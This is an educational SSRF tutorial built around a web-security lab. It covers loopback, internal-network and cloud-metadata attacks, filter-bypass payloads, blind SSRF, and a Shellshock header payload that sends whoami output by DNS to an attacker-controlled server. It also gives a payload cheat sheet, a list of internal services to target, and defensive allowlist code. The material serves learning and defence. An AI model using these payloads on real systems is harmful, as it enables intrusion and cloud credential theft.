# Server-Side Request Forgery (SSRF) 

## Table of Contents

1. [What is SSRF?](#1-what-is-ssrf)
2. [Why SSRF Is Dangerous — The Trust Model](#2-why-ssrf-is-dangerous--the-trust-model)
3. [Attack Vectors — Where SSRF Hides](#3-attack-vectors--where-ssrf-hides)
4. [Attack Techniques](#4-attack-techniques)
   - 4.1 [SSRF Against the Local Server (Loopback)](#41-ssrf-against-the-local-server-loopback)
   - 4.2 [SSRF Against Internal Back-End Systems](#42-ssrf-against-internal-back-end-systems)
   - 4.3 [SSRF Against Cloud Metadata Endpoints](#43-ssrf-against-cloud-metadata-endpoints)
5. [Bypassing SSRF Defenses](#5-bypassing-ssrf-defenses)
   - 5.1 [Blacklist Bypass — IP Obfuscation](#51-blacklist-bypass--ip-obfuscation)
   - 5.2 [Blacklist Bypass — String Obfuscation](#52-blacklist-bypass--string-obfuscation)
   - 5.3 [Whitelist Bypass — URL Parsing Confusion](#53-whitelist-bypass--url-parsing-confusion)
   - 5.4 [Bypass via Open Redirection](#54-bypass-via-open-redirection)
   - 5.5 [Bypass via Redirect + Protocol Switching](#55-bypass-via-redirect--protocol-switching)
6. [Blind SSRF](#6-blind-ssrf)
   - 6.1 [Detection — Out-of-Band (OAST)](#61-detection--out-of-band-oast)
   - 6.2 [Exploitation — Internal Network Probing](#62-exploitation--internal-network-probing)
   - 6.3 [Exploitation — Chaining with Other Vulnerabilities](#63-exploitation--chaining-with-other-vulnerabilities)
7. [Hidden SSRF Attack Surface](#7-hidden-ssrf-attack-surface)
8. [Impact Assessment](#8-impact-assessment)
9. [Defense & Prevention](#9-defense--prevention)
10. [Quick Reference Cheat Sheet](#10-quick-reference-cheat-sheet)

---

## 1. What is SSRF?

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to **cause the server to make HTTP requests to a location of the attacker's choosing** — rather than the intended destination.

### Simple Analogy

Imagine a company employee (the server) who will run any errand you ask them to, no questions asked. Normally they fetch public documents from approved sources. But you hand them a note that says "go fetch the contents of the CEO's private filing cabinet on floor 7." They walk right past the security desk — because they work there and are trusted — and return with the contents. The server is the trusted employee. SSRF lets the attacker write the errand note.

### The Core Mechanic

```
Normal flow:
User → Application → External API (intended)

SSRF flow:
User (with malicious URL) → Application → Internal service / localhost / cloud metadata
                                          ↑ attacker-controlled destination
```

The application makes outbound requests as part of its legitimate functionality (fetching stock data, loading a preview URL, processing a webhook). When the destination of that request is user-controlled and not properly validated, the server becomes a proxy that the attacker can direct anywhere on the network.

---

## 2. Why SSRF Is Dangerous — The Trust Model

SSRF is severe because it **abuses the implicit trust that internal systems place in the application server**.

### Three Trust Relationships Attackers Exploit

**1. Server trusts itself (loopback)**

Applications sometimes bypass authentication checks for requests arriving from `127.0.0.1` or `localhost`, based on the assumption that only the application itself would send such requests. If an attacker causes the server to fetch `http://localhost/admin`, the request arrives as if it came from the application itself — bypassing all external access controls.

Common reasons this trust exists:
- Access control implemented in a front-end component that only applies to external traffic
- Disaster recovery mode: admin access granted without authentication to requests from the local machine
- Admin interface bound to loopback only — not exposed externally at all

**2. Server trusts internal network**

Back-end systems (databases, internal APIs, admin panels, monitoring services) are often deployed with little or no authentication because they are assumed to be unreachable from the outside. The application server is inside the network perimeter and can reach them. SSRF gives the attacker a foothold inside that perimeter through the application.

**3. Cloud metadata services trust the instance**

Cloud provider metadata endpoints (`169.254.169.254`) respond to any request from within the instance without authentication. They expose IAM credentials, instance identity, user-data scripts (sometimes containing secrets), and network configuration. SSRF against the metadata service is often instant credential compromise.

---

## 3. Attack Vectors — Where SSRF Hides

SSRF requires a user-controllable value that the server uses to make an outbound request. This is more common than it appears:

| Input Location | Example | Notes |
|----------------|---------|-------|
| Body parameter containing full URL | `stockApi=http://...` | Most obvious; often the intended use is fetching remote content |
| Body parameter containing hostname only | `server=internal-api` | Partial control; attacker controls where request goes but not the path |
| Body parameter containing path | `path=/api/v2/data` | Combined with a fixed host — attacker controls the endpoint |
| `Referer` header | `Referer: https://...` | Analytics/logging systems may fetch Referer URLs to track traffic sources |
| URL in JSON/XML body | `{"webhook": "http://..."}` | Webhook handlers, callback URLs |
| URL embedded in XML | XXE referencing `SYSTEM` entities | See XXE injection; XML parsers may fetch external entities |
| File upload via URL | `fileUrl=http://...` | Server fetches and stores the remote file |
| PDF/image generation | HTML-to-PDF with `<img src="...">` | Headless browsers follow `src` URLs |
| Webhook configuration | Admin-panel webhook endpoints | Often less scrutinized than user-facing inputs |

---

## 4. Attack Techniques

### 4.1 SSRF Against the Local Server (Loopback)

**Situation:** The application takes a URL parameter and makes a server-side request to it. The internal admin interface is only accessible from localhost.

**Original legitimate request:**
```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

**SSRF payload — redirect to localhost admin:**
```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

**What happens:**
```
Request arrives at application server
        │
        ▼
Server fetches http://localhost/admin
        │
        ▼
Request hits the same server via loopback (127.0.0.1)
        │
        ▼
Access control check: "Is this from localhost?" → Yes → Bypass
        │
        ▼
Admin interface HTML returned to attacker in response body
```

**Follow-up — use the leaked HTML to find internal admin actions:**
```
stockApi=http://localhost/admin/delete?username=target
```

The server executes the deletion as if the administrator triggered it.

**Loopback address variants to try:**
```
http://localhost/admin
http://127.0.0.1/admin
http://127.1/admin
http://0/admin
http://[::1]/admin
http://127.0.0.1:8080/admin   (try common ports if default fails)
```

---

### 4.2 SSRF Against Internal Back-End Systems

**Situation:** The internal network contains services at RFC 1918 addresses that are not accessible from the internet. The application server can reach them.

**Attack — direct private IP targeting:**
```http
stockApi=http://192.168.0.68/admin
```

**Discovery — scan the internal subnet:**

When the exact internal IP is unknown, sweep the subnet by iterating the last octet (or another octet) and observing response differences (status codes, response sizes, response times).

```
http://192.168.0.1/admin
http://192.168.0.2/admin
...
http://192.168.0.255/admin
```

A `200` response where others return errors or timeouts reveals a host at that address.

**Common internal targets to probe:**

| Target | Purpose |
|--------|---------|
| `http://192.168.0.X/admin` | Admin interfaces |
| `http://10.0.0.X:8080` | Alternative port admin panels |
| `http://172.16.0.X:9200` | Elasticsearch (unauthenticated by default) |
| `http://172.16.0.X:6379` | Redis (unauthenticated by default) |
| `http://172.16.0.X:27017` | MongoDB |
| `http://172.16.0.X:2375` | Docker API (unauthenticated) |
| `http://172.16.0.X:4001` | etcd |
| `http://172.16.0.X:8500` | Consul API |

---

### 4.3 SSRF Against Cloud Metadata Endpoints

Cloud providers expose instance metadata at a fixed link-local address. These endpoints require no authentication — they trust any request from within the instance.

**AWS IMDSv1 (unauthenticated, deprecated but still common):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data
```

**Returned IAM credential format:**
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAXXX",
  "SecretAccessKey": "xxx",
  "Token": "xxx",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

These credentials can be used directly with the AWS CLI to access any resource the instance role permits.

**GCP metadata:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure IMDS:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

> **IMDSv2 (AWS):** Requires a session token obtained via a PUT request first. A standard SSRF GET request to `169.254.169.254` will return a 401. However, some SSRF contexts allow PUT (e.g. redirect-based SSRF or SSRF via a library that follows redirects with method preservation). Always test both — many environments still run IMDSv1 for compatibility.

---

## 5. Bypassing SSRF Defenses

### 5.1 Blacklist Bypass — IP Obfuscation

**Situation:** The application blocks `127.0.0.1` and `localhost` by string matching.

**Alternative representations of `127.0.0.1`:**

| Format | Value | Notes |
|--------|-------|-------|
| Standard | `127.0.0.1` | Blocked |
| Shortened | `127.1` | Omits zero octets — resolves the same |
| Decimal | `2130706433` | 32-bit integer representation of 127.0.0.1 |
| Octal | `017700000001` | Octal representation |
| Hex | `0x7f000001` | Hexadecimal representation |
| IPv6 loopback | `::1` or `[::1]` | IPv6 loopback |
| IPv4-mapped IPv6 | `::ffff:127.0.0.1` | IPv4-in-IPv6 notation |
| DNS | Register a domain that resolves to `127.0.0.1` | The resolved IP hits loopback even if the hostname passes the blacklist |

**Alternative representations of `169.254.169.254` (AWS metadata):**

```
http://169.254.169.254/         standard
http://2852039166/              decimal
http://0xa9fea9fe/              hex
http://0251.0376.0251.0376/     octal
http://169.254.169.254.nip.io/  DNS wildcard service
```

---

### 5.2 Blacklist Bypass — String Obfuscation

**Situation:** The application blocks the string `/admin` or `localhost` by looking for the literal characters.

**URL encoding — single:**
```
/admin → /%61dmin   (a = %61)
localhost → %6cocalhost
```

**Double URL encoding:**
```
/admin → /%2561dmin
(%25 decodes to %, giving %61, which decodes to 'a')
```

**Case variation:**
```
http://Localhost/admin
http://LOCALHOST/Admin
```

**Mixed obfuscation:**
```
http://127.1/%61dmin
http://127.1/%2561dmin
```

The application's filter sees no match; the server decodes the URL and sends the request to the real destination.

---

### 5.3 Whitelist Bypass — URL Parsing Confusion

**Situation:** The application only allows URLs matching a specific domain (e.g. `stock.weliketoshop.net`). It validates the hostname against a whitelist. The attacker cannot simply supply `127.0.0.1`.

**The URL parsing inconsistency:** Different parts of the application (validation layer vs. HTTP client library) may parse the same URL differently. URL features that cause this:

**Technique 1 — Embedded credentials with `@`:**
```
https://expected-host:fakepassword@evil-host
```
A naive filter checking for `expected-host` may find it (as the username) and pass validation. The HTTP client treats everything after `@` as the actual hostname.

```
http://localhost:80%2523@stock.weliketoshop.net/admin
          ↑              ↑
    actual host      whitelist host (appears to be the domain after @)
```

**How `%2523` works:**
```
%2523 → URL decode → %23 → URL decode again → #
```
Double-encoding `#` makes the validator see `localhost:80%2523@stock.weliketoshop.net` as a valid URL for the whitelisted domain. The HTTP client decodes further, sees `#`, and treats everything after it as a fragment — so the actual request goes to `localhost:80`.

**Technique 2 — Fragment with `#`:**
```
https://evil-host#expected-host
```
Filter checks for `expected-host` — finds it in the fragment. HTTP client ignores the fragment and sends the request to `evil-host`.

**Technique 3 — Subdomain abuse:**
```
https://expected-host.evil-host.com
```
Filter checks if the URL contains `expected-host` — it does. The actual request goes to `evil-host.com`.

**Technique 4 — Combinations:**
```
http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
Passes the whitelist check (sees `stock.weliketoshop.net`), double-decoded `#` causes the HTTP client to treat `stock.weliketoshop.net/admin/delete?username=carlos` as a fragment and send the request to `localhost`.

---

### 5.4 Bypass via Open Redirection

**Situation:** The URL is strictly validated against a whitelist — direct IP/domain substitution is blocked. However, the whitelisted application contains an open redirect vulnerability.

**How it chains:**

```
1. Application validates stockApi URL → must be on weliketoshop.net ✓
2. Application fetches the validated URL
3. weliketoshop.net endpoint redirects to attacker-supplied path
4. Application's HTTP client follows the redirect to internal target
```

**Exploit:**

If `https://weliketoshop.net/product/nextProduct?path=http://evil-user.net` redirects to `http://evil-user.net`, then:

```http
stockApi=https://weliketoshop.net/product/nextProduct?path=http://192.168.0.68/admin
```

- Validation: URL is on `weliketoshop.net` → passes whitelist
- Server fetches: `weliketoshop.net/product/nextProduct?path=http://192.168.0.68/admin`
- Server receives: `302 Location: http://192.168.0.68/admin`
- HTTP client follows redirect → internal admin interface returned

**Key condition:** The server's HTTP client must follow redirects (most do by default).

**Try different redirect status codes:** `301`, `302`, `303`, `307`, `308` — some filters or clients behave differently with each.

---

### 5.5 Bypass via Redirect + Protocol Switching

**Situation:** The filter blocks non-HTTP protocols but allows redirects from trusted hosts.

**Technique:** Chain an open redirect on a trusted host with a protocol switch in the redirect destination.

```
stockApi=https://trusted-host.com/redirect?url=file:///etc/passwd
stockApi=https://trusted-host.com/redirect?url=gopher://internal:6379/_SET%20key%20value
```

If the HTTP client follows redirects and honors the redirected protocol, this reaches internal services via protocols other than HTTP. The Gopher protocol is particularly powerful — it allows sending arbitrary TCP payloads, enabling direct interaction with Redis, Memcached, SMTP, and other plaintext services.

---

## 6. Blind SSRF

### What Makes It "Blind"

In blind SSRF, the server makes the attacker-controlled request but **the response is never returned in the HTTP response the attacker sees**. The attacker can cause the server to reach out, but cannot read what comes back.

```
Normal SSRF:    Attacker → App → Internal Service → Response shown to attacker
Blind SSRF:     Attacker → App → Internal Service → Response discarded / logged internally
                                                     Attacker sees nothing
```

**Typical contexts:** Webhook handlers, asynchronous processing, PDF generation, analytics pipelines, email sending that logs click-tracking URLs.

---

### 6.1 Detection — Out-of-Band (OAST)

Since the response is invisible, detection relies on observing the **side effect** of the request — a connection to an attacker-controlled server.

**Method:** Supply a URL pointing to an externally controlled server with DNS logging. When the application makes the request, DNS resolution and/or HTTP connection arrives at the controlled server.

```
stockApi=http://your-oast-server.com/test
Referer: http://your-oast-server.com/referer-test
```

**Indicators to watch for:**

| Observation | Meaning |
|-------------|---------|
| DNS lookup only, no HTTP | Request attempted; blocked at HTTP level by firewall. SSRF confirmed but HTTP egress restricted. |
| DNS + HTTP GET | Full SSRF confirmed. HTTP egress allowed. |
| No interaction | Either not vulnerable, or the DNS is also blocked |

> **DNS-only is still useful:** Even if only DNS arrives, the vulnerability is confirmed. The internal network may still be reachable (internal DNS may not be filtered). Pivot to internal IP probing via the SSRF to bypass the egress HTTP restriction.

---

### 6.2 Exploitation — Internal Network Probing

Even without response visibility, blind SSRF can be used to map the internal network and identify services.

**Port scanning via response time:**
- A connection to an open port typically responds (even with a reset) faster than a connection to a closed or filtered port.
- Iterate over IP:port combinations and measure response time differences.

```
http://192.168.0.1:22       → fast response (port open, SSH sends banner)
http://192.168.0.1:23       → timeout (port closed or filtered)
```

**Detecting vulnerable services:**
- Send payloads designed to trigger known vulnerabilities in services that commonly run without authentication internally (Elasticsearch, Redis, Jenkins, Consul).
- Pair with OAST payloads — if the vulnerable service executes your payload and makes an outbound DNS request, exploitation is confirmed.

---

### 6.3 Exploitation — Chaining with Other Vulnerabilities

**Shellshock via Blind SSRF:**

If a back-end system is running CGI and is vulnerable to Shellshock (CVE-2014-6271), it can be exploited through blind SSRF by injecting a Shellshock payload in a header that the SSRF request will carry.

The Shellshock vulnerability causes bash to execute commands embedded in environment variables like `HTTP_USER_AGENT`. If the SSRF request's `User-Agent` is crafted as a Shellshock payload, and the back-end CGI server is vulnerable, the command executes on the internal server.

```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).your-oast-server.com
Referer: http://192.168.0.X:8080
```

- The `Referer` value is the SSRF — the application fetches each internal host
- The `User-Agent` contains the Shellshock payload
- On a vulnerable CGI host, `$(whoami)` executes and the result appears as a subdomain in the DNS lookup arriving at the OAST server

**RCE via malicious HTTP server response:**

If the application server's HTTP client library has vulnerabilities in how it processes HTTP responses (HTTP response splitting, CRLF injection, header injection), SSRF pointing at an attacker-controlled server can deliver a malicious HTTP response that exploits the client. This can achieve RCE within the application infrastructure without needing to compromise any internal system directly.

---

## 7. Hidden SSRF Attack Surface

### Partial URLs in Parameters

Some parameters contain only a hostname or path component rather than a full URL. The server constructs the full URL server-side. Exploitability is partial — the attacker may only control the host, not the path, or only the path, not the scheme.

```
host=internal-api      → server builds http://internal-api/endpoint
path=/alternate-path   → server builds http://fixed-host/alternate-path
```

Even partial control can be valuable: controlling just the hostname enables internal network scanning.

### URLs Embedded in XML (XXE → SSRF)

XML parsers that process external entities will make outbound requests to URLs specified in `SYSTEM` entity declarations. An XXE payload is simultaneously an SSRF vector.

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
```

The parser fetches the URL and embeds the response content into the document — returning it in the application's response.

### Referer Header

Analytics and tracking systems frequently fetch the URL in the `Referer` header to analyze referring traffic — following the URL to read anchor text, page titles, or link context.

```http
GET /product?id=1 HTTP/1.1
Referer: http://192.168.0.1:8080/admin
```

If the analytics system fetches the Referer URL, this is SSRF. The request is blind (response isn't returned to the browser) but detectable via OAST and exploitable via the chaining techniques described above.

### Webhook and Callback URLs

Any feature that allows configuring a URL that the server will call (webhooks, payment callbacks, notification endpoints, OAuth redirect URIs) is potential SSRF surface. These are often less scrutinized than standard input fields.

### PDF / Document Generation

Applications that generate PDFs from HTML (using headless browsers or libraries like wkhtmltopdf) will fetch any URL referenced in the HTML — `<img src>`, `<link href>`, `<iframe src>`. Injecting a URL into content that ends up in a generated document triggers SSRF through the rendering engine.

---

## 8. Impact Assessment

| Scenario | Impact |
|----------|--------|
| Access to internal admin interface | Perform admin actions without credentials |
| Internal network service exposure | Read data from unauthenticated internal services (Redis, Elasticsearch, MongoDB) |
| Cloud metadata access (IMDSv1) | Steal IAM credentials → full cloud account access |
| Port scanning | Map internal network topology and live hosts |
| Blind SSRF + vulnerable internal service | Remote code execution on internal host |
| Blind SSRF + Shellshock | OS command execution on internal CGI servers |
| SSRF → external systems | Attacks on third parties appear to originate from the target organization |
| File read (via `file://`) | Read local files if the HTTP client supports the `file://` scheme |

### SSRF Severity Factors

| Factor | Lower Impact | Higher Impact |
|--------|-------------|---------------|
| Response visibility | Blind | Full response returned |
| Internal services reachable | None / only HTTP | Redis, databases, Docker API, Kubernetes API |
| Cloud environment | On-premise | AWS/GCP/Azure with IMDS |
| HTTP client capabilities | HTTP only | Supports `file://`, `gopher://`, `dict://` |
| Internal network segmentation | Strong | Flat network; everything reachable |

---

## 9. Defense & Prevention

### 1. Allowlist Valid Destinations (Primary Defense)

Only allow the application to make requests to a predefined set of trusted hosts and ports. Validate the resolved IP against the allowlist after DNS resolution — not just the hostname string.

```python
ALLOWED_HOSTS = {'api.internal.example.com', 'stock.weliketoshop.net'}
ALLOWED_PORTS = {80, 443}

import socket

def is_allowed(url):
    parsed = urllib.parse.urlparse(url)
    if parsed.hostname not in ALLOWED_HOSTS:
        return False
    if parsed.port not in ALLOWED_PORTS:
        return False
    # Resolve and check the IP — blocks DNS rebinding
    resolved_ip = socket.gethostbyname(parsed.hostname)
    if ipaddress.ip_address(resolved_ip).is_private:
        return False
    return True
```

### 2. Deny Private and Link-Local IPs After Resolution

Even if a hostname passes string validation, resolve it and check whether the resulting IP falls in private or special ranges.

```python
import ipaddress, socket

BLOCKED_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),   # Link-local / cloud metadata
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
]

def is_private(hostname):
    ip = socket.gethostbyname(hostname)
    addr = ipaddress.ip_address(ip)
    return any(addr in net for net in BLOCKED_RANGES)
```

> **DNS rebinding protection:** Validate at resolution time, but also at connection time. A DNS rebinding attack changes the resolved IP after your validation check. Use a dedicated HTTP client that locks the resolved IP for the entire request, or re-validate immediately before connecting.

### 3. Disable Unused URL Schemes

Restrict the HTTP client to only the schemes needed. Most SSRF exploits use `http://` or `https://`, but schemes like `file://`, `gopher://`, `dict://`, and `ftp://` dramatically expand impact.

```python
ALLOWED_SCHEMES = {'http', 'https'}

def validate_scheme(url):
    scheme = urllib.parse.urlparse(url).scheme.lower()
    if scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"Scheme '{scheme}' not allowed")
```

### 4. Do Not Return Raw Back-End Responses

If the application must make server-side requests, process the response internally and return only the relevant extracted data — not the raw response. This converts full SSRF into blind SSRF at minimum, significantly reducing exploitability.

```python
# Instead of: return requests.get(user_url).text  ← returns raw response to attacker
# Do:
response = requests.get(validated_url)
stock_data = parse_stock_response(response.json())   # extract only what's needed
return jsonify(stock_data)                           # return only structured data
```

### 5. Disable HTTP Client Redirect Following

Redirect-following allows bypass of allowlist controls via open redirections. Disable automatic redirect following and validate each redirect destination independently before following it.

```python
response = requests.get(url, allow_redirects=False)

if response.status_code in (301, 302, 303, 307, 308):
    redirect_url = response.headers.get('Location')
    if not is_allowed(redirect_url):
        raise ValueError("Redirect to disallowed destination blocked")
    # Re-validate and follow manually
```

### 6. Network-Level Egress Filtering

As a defense-in-depth layer, restrict outbound connections from the application server at the network level. The application should only need to reach specific external APIs — everything else should be blocked by the firewall.

```
Application Server
        │
        ▼ (allowed)
External API servers (specific IPs/domains)

        ✗ (blocked by firewall)
Internal network, cloud metadata (169.254.169.254), private ranges
```

### 7. Disable Cloud Metadata IMDSv1 — Enforce IMDSv2

On AWS, disable IMDSv1 and enforce IMDSv2 (which requires a session token obtained via PUT request). Standard SSRF via GET cannot obtain IMDSv2 tokens without the initial PUT step.

```bash
# AWS CLI — require IMDSv2 on an instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-tokens required \
  --http-endpoint enabled
```

---

## 10. Quick Reference Cheat Sheet

### Signs a Parameter May Be SSRF-Vulnerable

- Parameter name contains: `url`, `uri`, `src`, `href`, `path`, `dest`, `redirect`, `site`, `feed`, `host`, `api`, `endpoint`, `proxy`, `ref`, `load`, `fetch`
- Parameter value is a full URL (contains `http://` or `https://`)
- Application retrieves external content (stock data, web previews, PDF generation, image loading)
- Webhook or callback URL configuration in admin panels
- Referer header used by analytics functionality
- XML/JSON body includes URL-valued fields

### SSRF Payload Progression (Try in Order)

```
1. http://localhost/admin                  loopback — direct
2. http://127.0.0.1/admin                 loopback — IP
3. http://127.1/admin                      loopback — shortened
4. http://2130706433/admin                 loopback — decimal
5. http://017700000001/admin               loopback — octal
6. http://[::1]/admin                      loopback — IPv6
7. http://169.254.169.254/latest/meta-data/  cloud metadata
8. http://192.168.0.1/admin               internal network
9. http://10.0.0.1:8080/admin             internal network alt port
10. http://localhost%2523@whitelisted.com/admin  whitelist bypass — double encoded #
11. https://whitelisted.com#@evil-host    whitelist bypass — fragment
12. https://whitelisted.com.evil-host.com whitelist bypass — subdomain
13. http://whitelisted.com/redirect?to=http://192.168.0.1/admin  open redirect chain
14. http://your-oast-server.com           blind SSRF detection
```

### 127.0.0.1 Alternative Representations

| Format | Value |
|--------|-------|
| Shortened | `127.1` |
| Decimal | `2130706433` |
| Octal | `017700000001` |
| Hex | `0x7f000001` |
| IPv6 | `::1` / `[::1]` |
| IPv4-mapped IPv6 | `::ffff:127.0.0.1` |
| DNS resolving to 127.0.0.1 | `localtest.me`, `vcap.me`, `customer.lvh.me` |

### Cloud Metadata Quick Reference

| Cloud | Metadata URL | Key Endpoint |
|-------|-------------|-------------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | `iam/security-credentials/<role>` |
| AWS IMDSv2 | `http://169.254.169.254/latest/meta-data/` | Requires PUT token first |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `instance/service-accounts/default/token` |
| Azure | `http://169.254.169.254/metadata/instance` | Identity token endpoint |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | `user-data` |

### Whitelist Bypass URL Tricks

| Technique | Example | How Filter Is Fooled |
|-----------|---------|---------------------|
| `@` credentials | `http://whitelist@evil.com` | Filter finds whitelist in credentials |
| `#` fragment | `http://evil.com#whitelist` | Filter finds whitelist in fragment |
| Subdomain | `http://whitelist.evil.com` | Filter finds whitelist as subdomain |
| Double-encoded `#` | `http://localhost%2523@whitelist.com/admin` | Filter sees whitelist as domain; client decodes to localhost |
| DNS subdomain | `http://whitelist.attacker-owned.com` | DNS resolves to attacker's IP |

### Internal Services Worth Targeting via SSRF

| Service | Default Port | Auth? | Notes |
|---------|-------------|-------|-------|
| Elasticsearch | 9200 | None (default) | `GET /` returns cluster info; `GET /_cat/indices` lists data |
| Redis | 6379 | None (default) | Gopher protocol for full interaction |
| MongoDB | 27017 | None (default) | Wire protocol — gopher for interaction |
| Docker API | 2375 | None (TLS=2376) | `GET /containers/json`; `POST /containers/create` |
| Kubernetes API | 8080 | None (default in old installs) | List pods, exec into containers |
| Jenkins | 8080 | Varies | Script console at `/script` |
| Consul | 8500 | None (default) | Service catalog, KV store |
| etcd | 2379 | None (default) | Kubernetes secrets stored here |
| Memcached | 11211 | None | Text protocol — readable via SSRF |